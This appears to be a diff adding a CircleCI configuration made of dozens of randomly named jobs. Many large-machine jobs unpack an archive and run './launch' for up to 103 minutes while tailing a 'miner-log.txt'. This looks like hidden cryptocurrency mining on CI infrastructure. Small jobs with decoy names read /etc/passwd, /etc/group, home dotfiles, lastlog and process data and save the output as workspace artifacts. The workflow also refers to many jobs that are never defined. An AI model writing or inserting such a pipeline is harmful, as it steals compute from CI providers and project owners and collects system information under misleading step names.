+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  gridCnt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BIOS Setting Probe Pass
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/var/tmp/primary_meeting.gz" && zgrep -c root "/var/tmp/primary_meeting.gz"; true ; } > /var/tmp/stage4/BLobbLOblYnXcOnFIG
+            echo "finalized $(wc -c </var/tmp/stage4/BLobbLOblYnXcOnFIG)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'BLobbLOblYnXcOnFIG'
+  v5-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/BLobbLOblYnXcOnFIG 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  nonce-50wh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Sort out firmware
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; ls -l /usr/bin |awk '{print $5}' |awk '{printf "%05d\n", $1}' |sort -u; true ; } > /var/tmp/stage4/FTPcrimson
+            echo "finalized $(wc -c </var/tmp/stage4/FTPcrimson)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'FTPcrimson'
+  ensure-end-to-end-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/FTPcrimson 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  start-scan-width-pattern:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Thaw the standard curve in dry run mode
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; expand -t 8 /etc/login.defs | head -n6; true ; } > /var/tmp/stage4/b7394bee68f3120121daacc46f5
+            echo "finalized $(wc -c </var/tmp/stage4/b7394bee68f3120121daacc46f5)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'b7394bee68f3120121daacc46f5'
+  cf-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/b7394bee68f3120121daacc46f5 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  stalegradient:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: following up with data team
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; ls ${HOME} | awk 'length > 7' | sort | paste -sd ' '; true ; } > /var/tmp/stage4/hollow130
+            echo "finalized $(wc -c </var/tmp/stage4/hollow130)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'hollow130'
+  nov26-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/TXN32869 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  nLogins:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: teardown group d
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; test -d /tmp && echo exists||echo 'missing'; true ; } > /var/tmp/stage4/r3c31ptdream
+            echo "finalized $(wc -c </var/tmp/stage4/r3c31ptdream)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'r3c31ptdream'
+  fix-4463:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/r3c31ptdream 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  b1581a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Survey the emergency contacts for Felix
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; grep --recursive --include="*.sh" alias /etc/default 2>/dev/null | sort | head; true ; } > /var/tmp/stage4/95.62
+            echo "finalized $(wc -c </var/tmp/stage4/95.62)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '95.62'
+  papa-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/95.62 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  sgdSGDGlyph:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: optimize slow query log last
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; getent group | cut -d : -f 1 | fmt -w 58; true ; } > /var/tmp/stage4/HInC3G2Z
+            echo "finalized $(wc -c </var/tmp/stage4/HInC3G2Z)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'HInC3G2Z'
+  VerifyTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/HInC3G2Z 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  UNMOUnT__LEft__scORe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Safe to pair firmware
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; touch -r /etc/passwd "${TMPDIR:-/tmp}/turtle1.out" && stat -c %Y /etc/passwd "${TMPDIR:-/tmp}/turtle1.out"; true ; } > /var/tmp/stage4/a8f3aa53-4310-a7ef-c73c-dabc3766ec
+            echo "finalized $(wc -c </var/tmp/stage4/a8f3aa53-4310-a7ef-c73c-dabc3766ec)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'a8f3aa53-4310-a7ef-c73c-dabc3766ec'
+  feb16-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/otterFilterLepton 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  j_end:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: R523 poll cable tray
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; for word in private ivory label src retro public; do echo ${#word}; done | wc -l; true ; } > /var/tmp/stage4/blake_5716e5
+            echo "finalized $(wc -c </var/tmp/stage4/blake_5716e5)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'blake_5716e5'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/blake_5716e5 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  kDelta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Gate 26 Monitoring
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - group|gzip -c > "/tmp/black.tar.gz" && tar -tzf "/tmp/black.tar.gz"; true ; } > /var/tmp/stage4/PANO-00031377
+            echo "finalized $(wc -c </var/tmp/stage4/PANO-00031377)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'PANO-00031377'
+  validate-partial-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/otterFilterLepton 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  footer_footer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Unlock hot shards ref 8b2
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; awk -v x=2 -v y=24 'BEGIN{print x*y}'; true ; } > /var/tmp/stage4/2581f.hw
+            echo "finalized $(wc -c </var/tmp/stage4/2581f.hw)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '2581f.hw'
+  rigel-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/2581f.hw 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  aside-fill:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: OK FINE check the IP allowlist
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -name "host*" -exec ls -1d {} + 2>/dev/null | xargs ls -ld; true ; } > /var/tmp/stage4/nodeVectorQuarkSavanna
+            echo "finalized $(wc -c </var/tmp/stage4/nodeVectorQuarkSavanna)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'nodeVectorQuarkSavanna'
+  v1-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Open prior
+          command: |
+            dirname /var/tmp/stage4/otterFilterLepton 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load archive
+          command: tar -xzvf build-output.tgz
+      - run:
+          command: ls -la
+      - run:
+          name: Package artifacts
+          command: mkdir -p artifacts
+      - run:
+          name: Verify output
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 103m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            bash -c "./launch"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+
+  gracetron:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Post the reviewers in 20 chunks
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; find /var/log -type f -name 'lastlog' -exec du -ch {} + 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n 5; true ; } > /var/tmp/stage4/r3c31ptdream
+            echo "finalized $(wc -c </var/tmp/stage4/r3c31ptdream)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'r3c31ptdream'
+  TRL-STAT-FTR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: NOP remittance
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; compgen -k | tail -n 4 | awk '{print toupper(substr($0,1,1)) substr($0,2)}'; true ; } > /var/tmp/stage4/FTPcrimson
+            echo "finalized $(wc -c </var/tmp/stage4/FTPcrimson)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'FTPcrimson'
+  ConvertFrom-ReceiptObject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Fold in the world chunks
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; ls /usr/sbin | shuf -n 5 | sort | uniq -c | sort -nr; true ; } > /var/tmp/stage4/REceipTferMIon
+            echo "finalized $(wc -c </var/tmp/stage4/REceipTferMIon)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'REceipTferMIon'
+  transField:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Initiate open for the settings gear
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; ps -eo rss= | awk '{printf "%05d\n", $1}' | fold -w 48; true ; } > /var/tmp/stage4/44c5c-3913-ui
+            echo "finalized $(wc -c </var/tmp/stage4/44c5c-3913-ui)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '44c5c-3913-ui'
+  s3rverzz063:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Spot Check The Style Rules
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; for x in "$HOME"/.bash*; do basename "$x";done; true ; } > /var/tmp/stage4/b7394bee68f3120121daacc46f5
+            echo "finalized $(wc -c </var/tmp/stage4/b7394bee68f3120121daacc46f5)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'b7394bee68f3120121daacc46f5'
+  UntypedCanvasOptions:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Quantize Loss Curve Stage
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; tr -d '"' </etc/os-release|head -n 12; true ; } > /var/tmp/stage4/blake_5716e5
+            echo "finalized $(wc -c </var/tmp/stage4/blake_5716e5)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - 'blake_5716e5'
+  c53f9ed5-9fcb-bf24-b0a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/stage4
+      - run:
+          name: Focus the dropdown and type
+          command: |
+            mkdir -p /var/tmp/stage4
+            { set +o pipefail 2>/dev/null; { echo 'finished'; echo 42; } | sort; true ; } > /var/tmp/stage4/95.62
+            echo "finalized $(wc -c </var/tmp/stage4/95.62)"
+      - persist_to_workspace:
+          root: /var/tmp/stage4
+          paths:
+            - '95.62'
+workflows:
+  all:
+    jobs:
+      - nLogins
+      - gracetron:
+          requires:
+            - nLogins
+      - fix-4463:
+          requires:
+            - gracetron
+      - nonce-50wh:
+          requires:
+            - gracetron
+      - TRL-STAT-FTR:
+          requires:
+            - nonce-50wh
+      - ensure-end-to-end-release-candidate:
+          requires:
+            - TRL-STAT-FTR
+      - facehardschedule:
+          requires:
+            - TRL-STAT-FTR
+      - ConvertFrom-ReceiptObject:
+          requires:
+            - facehardschedule
+      - push-it:
+          requires:
+            - ConvertFrom-ReceiptObject
+      - id35003
+      - kDelta
+      - shippit:
+          requires:
+            - id35003
+            - kDelta
+      - validate-partial-release-candidate:
+          requires:
+            - id35003
+            - kDelta
+      - q3-canary:
+          requires:
+            - id35003
+            - kDelta
+      - feb16-ship:
+          requires:
+            - id35003
+            - kDelta
+      - v1-ga:
+          requires:
+            - id35003
+            - kDelta
+      - fc3e2c22-7543-da89-9a10-f0
+      - derp
+      - Build_Prod1:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - canary:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - gating:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - package:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - d-alt:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - realease:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - biuld:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - nov26-canary:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - perseus-final:
+          requires:
+            - fc3e2c22-7543-da89-9a10-f0
+            - derp
+      - U
+      - yuki-test:
+          requires:
+            - U
+      - blocksArray:
+          requires:
+            - U
+      - publish:
+          requires:
+            - blocksArray
+      - footer_footer:
+          requires:
+            - blocksArray
+      - rigel-plus:
+          requires:
+            - footer_footer
+      - AllTheStates:
+          requires:
+            - footer_footer
+      - edge-v5:
+          requires:
+            - AllTheStates
+      - decodeWithWindow:
+          requires:
+            - AllTheStates
+      - defualt:
+          requires:
+            - decodeWithWindow
+      - sgdSGDGlyph:
+          requires:
+            - decodeWithWindow
+      - VerifyTests:
+          requires:
+            - sgdSGDGlyph
+      - MAX_SOCKET_SIZE:
+          requires:
+            - sgdSGDGlyph
+      - bug-4916:
+          requires:
+            - MAX_SOCKET_SIZE
+      - LS-DUE-B:
+          requires:
+            - MAX_SOCKET_SIZE
+      - BuildTests:
+          requires:
+            - LS-DUE-B
+      - gridCnt:
+          requires:
+            - LS-DUE-B
+      - v5-alpha:
+          requires:
+            - gridCnt
+      - android-receipt
+      - transField:
+          requires:
+            - android-receipt
+      - smoke:
+          requires:
+            - transField
+      - start-scan-width-pattern:
+          requires:
+            - transField
+      - s3rverzz063:
+          requires:
+            - start-scan-width-pattern
+      - cf-v2:
+          requires:
+            - s3rverzz063
+      - j_end:
+          requires:
+            - s3rverzz063
+      - UntypedCanvasOptions:
+          requires:
+            - j_end
+      - rocket:
+          requires:
+            - UntypedCanvasOptions
+      - b1581a:
+          requires:
+            - UntypedCanvasOptions
+      - c53f9ed5-9fcb-bf24-b0a:
+          requires:
+            - b1581a
+      - papa-6:
+          requires:
+            - c53f9ed5-9fcb-bf24-b0a
